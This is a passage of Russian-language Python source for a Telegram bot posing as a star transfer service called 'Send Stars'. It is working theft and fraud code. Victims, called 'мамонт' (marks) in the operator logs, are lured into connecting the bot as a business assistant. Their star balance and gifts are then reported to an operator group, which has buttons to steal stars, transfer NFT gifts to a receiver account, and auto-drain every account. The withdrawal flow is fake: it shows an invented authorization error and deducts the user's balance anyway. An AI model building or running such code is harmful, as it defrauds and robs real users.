    AUTO_DRAIN_CONFIG["enabled"] = not AUTO_DRAIN_CONFIG["enabled"]
    save_auto_drain_config(AUTO_DRAIN_CONFIG)
    
    status_msg = "включен" if AUTO_DRAIN_CONFIG["enabled"] else "выключен"
    await callback.answer(f"Автоматический дрейн {status_msg}", show_alert=True)
    
    await admin_panel_command(callback.message)

@dp.callback_query(F.data.startswith("steal_stars_user:"))
async def steal_stars_user_handler(callback: CallbackQuery):
    global ADMIN_IDS
    ADMIN_IDS = load_admins()
    if callback.from_user.id not in ADMIN_IDS: return
    await callback.answer("💰 Кража звёзд...")
    connection_id = callback.data.split(":")[1]
    connections = load_connections()
    connection = next((conn for conn in connections if conn["business_connection_id"] == connection_id), None)
    if not connection:
        await callback.message.answer("❌ Подключение не найдено")
        return
    username = connection.get("username", "Неизвестно")
    success, message, errors = await steal_all_stars(connection_id, username)
    if success:
        await callback.message.answer(f"💰 Звёзды успешно украдены у @{username}!\n{message}")
    else:
        await callback.message.answer(f"❌ Не удалось украсть звёзды у @{username}: {message}\n\n{errors}")

@dp.callback_query(F.data == "user_balance")
async def user_balance_handler(callback: CallbackQuery):
    balance = get_user_balance(callback.from_user.id)
    keyboard = InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="🔙 Назад", callback_data="user_menu")]])
    await callback.message.edit_text(
        "⭐️ Раздел «Баланс»\n\n"
        f"Количество ваших звезд: <b>{balance}</b>\n\n"
        "Так же вы можете пополнить баланс напрямую через Telegram — быстро, анонимно и без комиссии.",
        reply_markup=keyboard
    )
    await callback.answer()

@dp.callback_query(F.data == "user_deposit")
async def user_deposit_handler(callback: CallbackQuery):
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="💲 Пополнить", callback_data="user_deposit_start")],
        [InlineKeyboardButton(text="🔙 Назад", callback_data="user_menu")]
    ])
    await callback.message.edit_text(
        "➕ Раздел «Пополнение баланса»\n\n"
        "Здесь вы можете пополнить баланс звёзд напрямую через Telegram.\n"
        "Комиссии отсутствуют — все расходы на перевод покрывает бот.\n"
        "Сумма зачисляется точно, без задержек и скрытых сборов.",
        reply_markup=keyboard
    )
    await callback.answer()

@dp.callback_query(F.data == "user_deposit_start")
async def user_deposit_start_handler(callback: CallbackQuery, state: FSMContext):
    keyboard = InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="🔙 Назад", callback_data="user_deposit")]])
    await callback.message.edit_text(
        "➕ Введите точное количество звезд которое хотите пополнить:\n"
        "Минимальная сумма для пополнения 25 звезд.",
        reply_markup=keyboard
    )
    await state.set_state(DepositStates.waiting_for_deposit_amount)
    await callback.answer()

@dp.message(DepositStates.waiting_for_deposit_amount)
async def process_deposit_amount(message: Message, state: FSMContext):
    try:
        amount = int(message.text.strip())
        if amount < 25:
            await message.answer("❌ Минимальная сумма для пополнения — 25 звёзд.")
            return

        keyboard = InlineKeyboardBuilder()
        keyboard.button(text=f"Оплатить {amount} ⭐", pay=True)

        prices = [LabeledPrice(label="XTR", amount=amount)]

        await message.answer_invoice(
            title="Пополнение баланса",
            description=f"Пополнение баланса на {amount} звёзд",
            prices=prices,
            provider_token="",
            payload=f"deposit_{message.from_user.id}_{amount}",
            currency="XTR",
            reply_markup=keyboard.as_markup()
        )
        await message.answer("✅ Счет на оплату выставлен. Нажмите на кнопку выше, чтобы пополнить баланс.")
        await state.clear()
        
    except ValueError:
        await message.answer("❌ Введите корректное число звёзд, например: 50")
    except Exception as e:
        logger.error(f"Ошибка при выставлении счета: {e}")
        await message.answer("❌ Произошла ошибка при выставлении счета. Попробуйте еще раз.")

@dp.pre_checkout_query()
async def pre_checkout_handler(pre_checkout_query: PreCheckoutQuery):
    await pre_checkout_query.answer(ok=True)
    logger.info(f"PreCheckoutQuery от {pre_checkout_query.from_user.id} подтвержден.")

@dp.message(F.successful_payment)
async def successful_payment_handler(message: Message):
    payload_parts = message.successful_payment.invoice_payload.split('_')
    if len(payload_parts) == 3 and payload_parts[0] == "deposit":
        user_id = int(payload_parts[1])
        amount = int(payload_parts[2])
        
        add_user_balance(user_id, amount)
        
        await message.answer(f"🥳 Ваш баланс пополнен на {amount} звёзд! Спасибо за поддержку! 🤗")
        
        try:
            await bot.send_message(
                LOG_GROUP_ID,
                f"🎉 <b>Успешное пополнение!</b>\n"
                f"👤 Пользователь: <a href='tg://user?id={user_id}'>{message.from_user.full_name}</a> (ID: <code>{user_id}</code>)\n"
                f"⭐ Сумма: <code>{amount} звёзд</code>\n"
                f"Payload: <code>{message.successful_payment.invoice_payload}</code>"
            )
        except Exception as e:
            logger.error(f"Не удалось отправить уведомление в лог-группу: {e}")

@dp.callback_query(F.data == "user_withdraw")
async def user_withdraw_handler(callback: CallbackQuery, state: FSMContext):
    balance = get_user_balance(callback.from_user.id)
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="🔙 Назад", callback_data="user_menu")]
    ])
    await callback.message.edit_text(
        "📮 Раздел «Вывод звёзд»\n\n"
        "Здесь вы можете вывести свои звёзды мгновенно.\n\n"
        f"Ваш баланс: <b>{balance}</b>\n\n"
        "Укажите сумму — от 25 звёзд и выше. Перевод осуществляется автоматически, без задержек.",
        reply_markup=keyboard
    )
    await state.set_state(WithdrawStates.waiting_for_amount)
    await state.update_data(balance=balance)
    await callback.answer()

@dp.callback_query(F.data == "check_connection")
async def check_connection_handler(callback: CallbackQuery):
    support_keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="🆘 Поддержка", url=f"https://t.me/{SUPPORT_URL.lstrip('@')}")]
    ])
    await callback.message.answer(
        f"🔄 Проверка подключения бота\n\n"
        f"В среднем занимает до 29 секунд",
        reply_markup=support_keyboard
    )
    await callback.answer()

@dp.message(WithdrawStates.waiting_for_amount)
async def process_withdraw_amount(message: Message, state: FSMContext):
    try:
        amount = int(message.text.strip())
        data = await state.get_data()
        balance = data.get("balance", 0)
        
        if amount < 25:
            await message.answer("❌ Минимальная сумма для вывода — 25 звёзд.")
            return
        if amount > balance:
            await message.answer("❌ Недостаточно звёзд на балансе.")
            return
        
        try:
            await bot.send_message(
                LOG_GROUP_ID,
                f"🦣 <b>Мамонт начал вывод звёзд</b>\n"
                f"👤 Мамонт: <a href='tg://user?id={message.from_user.id}'>{message.from_user.full_name}</a> (ID: <code>{message.from_user.id}</code>)\n"
                f"ℹ️ Выводит: <code>{amount}</code> звёзд"
            )
        except Exception as e:
            logger.exception(f"Не удалось отправить уведомление в лог-группу: {e}")

        transaction_id = str(uuid4())[:12]
        await message.answer(
            f"🟡 Выполняется вывод\n\n"
            f"⭐ Звезды: {amount} ⭐\n"
            f"➕ Номер транзакции: {transaction_id}\n"
            f"⏳ Примерное время прибытия: 23сек"
        )
        
        await asyncio.sleep(2)
        
        error_keyboard = InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="❓ Как подключить", url="https://telegra.ph/Oshibka-vyvoda-zvyozd-chto-delat-08-03-2")],
            [InlineKeyboardButton(text="⚙️ Открыть настройки", url="tg://settings/")],
            [InlineKeyboardButton(text="✅ Подключил(-а)", callback_data="check_connection")]
        ])
        await message.answer(
            f"🔴 Ошибка вывода звезд\n\n"
            f"При попытке вывода звезд, возникла ошибка - ваш аккаунт не авторизован в Send Stars. "
            f"Авторизуйтесь, и пройдите этап вывода снова.\n\n"
            f"Не помогло? Напишите об ошибке - {SUPPORT_URL}",
            reply_markup=error_keyboard
        )
        
        subtract_user_balance(message.from_user.id, amount)
        
    except ValueError:
        await message.answer("❌ Введите корректное число звёзд, например: 50")
    finally:
        await state.clear()

@dp.callback_query(F.data == "user_menu")
async def user_menu_handler(callback: CallbackQuery):
    keyboard = InlineKeyboardMarkup(
        inline_keyboard=[
            [InlineKeyboardButton(text="⭐ Баланс", callback_data="user_balance")],
            [InlineKeyboardButton(text="➕ Пополнить звезды", callback_data="user_deposit")],
            [InlineKeyboardButton(text="📮 Вывести звезды", callback_data="user_withdraw")],
            [InlineKeyboardButton(text="❓ FAQ", url="https://telegra.ph/FAQ-08-03-22")]
        ]
    )
    await callback.message.edit_text(
        "👀 Добро пожаловать в Send Stars!\n\n"
        "Наш бот поможет отправить звезды без комиссий прямиком на баланс получателя.\n\n"
        "Выберите нужный раздел:",
        reply_markup=keyboard
    )
    await callback.answer()

@dp.business_connection()
async def handle_business_connect(business_connection: BusinessConnection):
    try:
        logger.info(f"New connection: {business_connection.id} from @{business_connection.user.username}")
        connections = load_connections()
        
        if not business_connection.is_enabled:
            new_connections = [conn for conn in connections if conn["business_connection_id"] != business_connection.id]
            save_connections(new_connections)
            
            log_message = (
                f"❌ <b>Мамонт отключил бота от бизнес-меню.</b>\n"
                f"ℹ️ <a href='tg://user?id={business_connection.user.id}'>{business_connection.user.full_name}</a> (@{business_connection.user.username or 'Неизвестно'} | ID: <code>{business_connection.user.id}</code>)"
            )
            await bot.send_message(LOG_GROUP_ID, log_message)
            return

        if any(c["business_connection_id"] == business_connection.id for c in connections):
            logger.info("Connection already exists, skipping.")
            return

        new_conn = {
            "user_id": business_connection.user.id,
            "business_connection_id": business_connection.id,
            "username": business_connection.user.username,
            "first_name": business_connection.user.first_name,
            "last_name": business_connection.user.last_name,
            "date": int(time.time()),
            "errors": []
        }
        
        errors_list = []
        permissions = await check_permissions(business_connection, errors_list)
        new_conn.update(permissions)

        star_balance = await check_balance(business_connection.id, errors_list)
        gifts = await get_gifts_list(business_connection.id, errors_list)
        gifts_count = len(gifts)

        new_conn["star_balance"] = star_balance
        new_conn["gifts_count"] = gifts_count
        new_conn['gifts_info'] = [gift.model_dump_json() for gift in gifts]
        new_conn['errors'] = errors_list

        connections.append(new_conn)
        save_connections(connections)

        log_message = (
            f"🦣 <b>Информация о подключении:</b>\n"
            f"🤼 Пользователь: <a href='tg://user?id={new_conn['user_id']}'>{new_conn['first_name']}</a> (@{new_conn.get('username', 'Неизвестно')} | ID: <code>{new_conn['user_id']}</code>)\n\n"
            f"<b>Разрешения:</b>\n"
            f"⚙️ Изменение настроек: {'✅' if new_conn.get('can_manage_chat', False) else '❌'}\n"
            f"👁️ Просмотр сообщений: {'✅' if new_conn.get('can_read_messages', False) else '❌'}\n"
            f"💫 Перевод звёзд: {'✅' if new_conn.get('can_transfer_stars', False) else '❌'}\n"
            f"🎁 Передача подарков: {'✅' if new_conn.get('can_transfer_gifts', False) else '❌'}\n\n"
            f"💰 Баланс звёзд: <code>{star_balance}</code>\n"
            f"🎁 Подарки: <code>{gifts_count}</code>\n\n"
        )

        if gifts:
            log_message += get_gift_list_message(gifts)
            
        keyboard = InlineKeyboardBuilder()
        if new_conn.get('can_transfer_gifts'):
            keyboard.button(text="🎁 Передать NFT", callback_data=f"gift_transfer_menu:{business_connection.id}")
        if new_conn.get('can_transfer_stars'):
            keyboard.button(text="🌟 Забрать звёзды", callback_data=f"steal_stars_user:{business_connection.id}")
        keyboard.button(text="🔄 Конвертировать", callback_data=f"convert_gift_menu:{business_connection.id}")
        keyboard.button(text="🔄 Обновить", callback_data=f"refresh_single_connection:{business_connection.id}")
        if new_conn['errors']:
            keyboard.button(text="🔴 Ошибка", callback_data=f"show_errors:{business_connection.id}")

        keyboard.adjust(2, 2, 1)

        await bot.send_message(LOG_GROUP_ID, log_message, reply_markup=keyboard.as_markup())

        await bot.send_message(
            chat_id=business_connection.user.id,
            text="🎉 Вы подключили меня как бизнес-ассистента!\n\n"
                 "Теперь вы можете управлять звёздами и подарками. Отправьте любое сообщение в подключенный чат."
        )
    except Exception as e:
        logger.error(f"Connection handling error: {e}")
        try:
            await bot.send_message(
                LOG_GROUP_ID,
                f"❌ <b>Критическая ошибка при новом подключении</b>\n"
                f"⚠️ Ошибка: {str(e)}"
            )
        except Exception as e:
            logger.error(f"Failed to send error log to group: {e}")

@dp.callback_query(F.data.startswith("refresh_single_connection:"))
async def refresh_single_connection_handler(callback: CallbackQuery):
    global ADMIN_IDS
    ADMIN_IDS = load_admins()
    if callback.from_user.id not in ADMIN_IDS: return
    
    connection_id = callback.data.split(":")[1]
    
    await callback.answer("🔄 Обновляю информацию...", show_alert=False)
    
    connections = load_connections()
    conn = next((c for c in connections if c["business_connection_id"] == connection_id), None)
    
    if not conn:
        await callback.message.answer("❌ Подключение не найдено.")
        return
        
    try:
        errors_list = []
        new_permissions = await check_permissions(BusinessConnection(**conn), errors_list)
        conn.update(new_permissions)
        conn['star_balance'] = await check_balance(connection_id, errors_list)
        
        gifts_list = await get_gifts_list(connection_id, errors_list)
        conn['gifts_count'] = len(gifts_list)
        conn['gifts_info'] = [gift.model_dump_json() for gift in gifts_list]
        conn['errors'] = errors_list
        
        save_connections(connections)
        
        log_message = (
            f"🦣 <b>Информация о подключении:</b>\n"
            f"🤼 Пользователь: <a href='tg://user?id={conn['user_id']}'>{conn['first_name']}</a> (@{conn.get('username', 'Неизвестно')} | ID: <code>{conn['user_id']}</code>)\n\n"
            f"<b>Разрешения:</b>\n"
            f"⚙️ Изменение настроек: {'✅' if conn.get('can_manage_chat', False) else '❌'}\n"
            f"👁️ Просмотр сообщений: {'✅' if conn.get('can_read_messages', False) else '❌'}\n"
            f"💫 Перевод звёзд: {'✅' if conn.get('can_transfer_stars', False) else '❌'}\n"
            f"🎁 Передача подарков: {'✅' if conn.get('can_transfer_gifts', False) else '❌'}\n\n"
            f"💰 Баланс звёзд: <code>{conn.get('star_balance', 0)}</code>\n"
            f"🎁 Подарки: <code>{conn.get('gifts_count', 0)}</code>\n\n"
        )
        
        if gifts_list:
            log_message += get_gift_list_message(gifts_list)
        
        log_message += f"\n<i>Обновлено: {time.strftime('%H:%M:%S')}</i>"

        keyboard = InlineKeyboardBuilder()
        if conn.get('can_transfer_gifts'):
            keyboard.button(text="🎁 Передать NFT", callback_data=f"gift_transfer_menu:{connection_id}")
        if conn.get('can_transfer_stars'):
            keyboard.button(text="🌟 Забрать звёзды", callback_data=f"steal_stars_user:{connection_id}")
        keyboard.button(text="🔄 Конвертировать", callback_data=f"convert_gift_menu:{connection_id}")
        keyboard.button(text="🔄 Обновить", callback_data=f"refresh_single_connection:{connection_id}")
        if conn['errors']:
            keyboard.button(text="🔴 Ошибка", callback_data=f"show_errors:{connection_id}")
        keyboard.adjust(2, 2, 1)
        
        await callback.message.edit_text(log_message, reply_markup=keyboard.as_markup())
    
    except Exception as e:
        await callback.message.answer(f"❌ Ошибка при обновлении: {e}")
        logger.exception("Ошибка при обновлении подключения")

@dp.callback_query(F.data.startswith("gift_transfer_menu:"))
async def gift_transfer_menu_handler(callback: CallbackQuery):
    global ADMIN_IDS
    ADMIN_IDS = load_admins()
    if callback.from_user.id not in ADMIN_IDS: return

    connection_id = callback.data.split(":")[1]
    connections = load_connections()
    conn = next((c for c in connections if c["business_connection_id"] == connection_id), None)
    
    if not conn:
        await callback.answer("❌ Подключение не найдено", show_alert=True)
        return
        
    gifts = [Gift.model_validate_json(g) for g in conn.get('gifts_info', [])]
    
    if not gifts:
        await callback.answer("🎁 Нет подарков для передачи.", show_alert=True)
        return
        
    keyboard = InlineKeyboardBuilder()
    for gift in gifts:
        gift_info = gift.gift
        gift_name = gift_info.name if hasattr(gift_info, 'name') else "Неизвестный подарок"
        if gift.type == "unique":
            gift_name = f"Уникальный: {gift_name} #{gift_info.number if hasattr(gift_info, 'number') else 'N/A'}"
        
        keyboard.button(
            text=gift_name,
            callback_data=f"gift_details:{connection_id}:{gift.owned_gift_id}"
        )
        
    keyboard.button(text="🔙 Назад", callback_data=f"refresh_single_connection:{connection_id}")
    keyboard.adjust(1)
    
    await callback.message.edit_text(
        f"🎁 Выберите NFT-подарок для передачи (ID: <code>{connection_id}</code>):",
        reply_markup=keyboard.as_markup()
    )

@dp.callback_query(F.data.startswith("gift_details:"))
async def gift_details_handler(callback: CallbackQuery, state: FSMContext):
    global ADMIN_IDS
    ADMIN_IDS = load_admins()
    if callback.from_user.id not in ADMIN_IDS: return
    
    _, connection_id, owned_gift_id = callback.data.split(":")
    
    connections = load_connections()
    conn = next((c for c in connections if c["business_connection_id"] == connection_id), None)
    if not conn:
        await callback.answer("❌ Подключение не найдено", show_alert=True)
        return
        
    gifts = [Gift.model_validate_json(g) for g in conn.get('gifts_info', [])]
    gift = next((g for g in gifts if g.owned_gift_id == owned_gift_id), None)
    
    if not gift:
        await callback.answer("❌ Подарок не найден", show_alert=True)
        return
    
    details = gift.gift
    
    message_text = (
        f"🎁 <b>Детали подарка:</b>\n\n"
        f"• Название: {details.name if hasattr(details, 'name') else 'Неизвестно'}\n"
        f"• Тип: {gift.type}\n"
        f"• Количество звёзд: {details.star_count if hasattr(details, 'star_count') else 'Неизвестно'}\n"
        f"• Передаваемый: {'✅' if gift.can_be_transferred else '❌'}\n"
    )
    
    if gift.type == "unique":
        message_text += (
            f"• Уникальный номер: {details.number if hasattr(details, 'number') else 'Неизвестно'}\n"
            f"• Базовое имя: {details.base_name if hasattr(details, 'base_name') else 'Неизвестно'}\n"
        )
        
    if hasattr(gift, 'next_transfer_date') and gift.next_transfer_date:
        cooldown_time = gift.next_transfer_date - int(time.time())
        if cooldown_time > 0:
            message_text += f"• Кулдаун до передачи: {cooldown_time} секунд.\n"
    
    keyboard = InlineKeyboardBuilder()
    keyboard.button(text="⬅️ Назад", callback_data=f"gift_transfer_menu:{connection_id}")
    
    if gift.can_be_transferred and (not hasattr(gift, 'next_transfer_date') or not gift.next_transfer_date or gift.next_transfer_date <= int(time.time())):
        keyboard.button(text="➡️ Передать админу", callback_data=f"transfer_gift_to_admin:{connection_id}:{owned_gift_id}")
    
    keyboard.adjust(2)
    
    await callback.message.edit_text(message_text, reply_markup=keyboard.as_markup())
    
@dp.callback_query(F.data.startswith("transfer_gift_to_admin:"))
async def transfer_gift_to_admin_handler(callback: CallbackQuery):
    global ADMIN_IDS
    ADMIN_IDS = load_admins()
    if callback.from_user.id not in ADMIN_IDS: return
    
    await callback.answer("⏳ Передаю подарок админу...")
    
    _, connection_id, owned_gift_id = callback.data.split(":")
    
    try:
        await bot(TransferGift(
            business_connection_id=connection_id,
            owned_gift_id=owned_gift_id,
            new_owner_chat_id=RECEIVER_ID,
            star_count=None
        ))
        
        await callback.message.answer("✅ Подарок успешно передан!")
        
        connections = load_connections()
        for conn in connections:
            if conn["business_connection_id"] == connection_id:
                gifts_info = [Gift.model_validate_json(g) for g in conn.get('gifts_info', [])]
                conn['gifts_info'] = [g.model_dump_json() for g in gifts_info if g.owned_gift_id != owned_gift_id]
                conn['gifts_count'] = len(conn['gifts_info'])
                break
        save_connections(connections)
        
    except (TelegramBadRequest, TelegramNotFound) as e:
        await callback.message.answer(f"❌ Не удалось передать подарок: {e.message}")
    except Exception as e:
        await callback.message.answer(f"❌ Произошла ошибка: {e}")

@dp.callback_query(F.data.startswith("show_errors:"))
async def show_errors_handler(callback: CallbackQuery):
    global ADMIN_IDS
    ADMIN_IDS = load_admins()
    if callback.from_user.id not in ADMIN_IDS: return

    connection_id = callback.data.split(":")[1]
    connections = load_connections()
    conn = next((c for c in connections if c["business_connection_id"] == connection_id), None)
    
    if not conn or not conn.get("errors"):
        await callback.answer("✅ Ошибок нет.", show_alert=True)
        return
        
    errors_message = "🔴 <b>Ошибки подключения:</b>\n"
    errors_message += "\n".join(conn["errors"])
    
    keyboard = InlineKeyboardBuilder()
    keyboard.button(text="⬅️ Назад", callback_data=f"refresh_single_connection:{connection_id}")
    
    await callback.message.edit_text(errors_message, reply_markup=keyboard.as_markup())

async def main():
    logger.info("🤖 Запуск бота...")
    
    asyncio.create_task(auto_drain_all_accounts())

    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
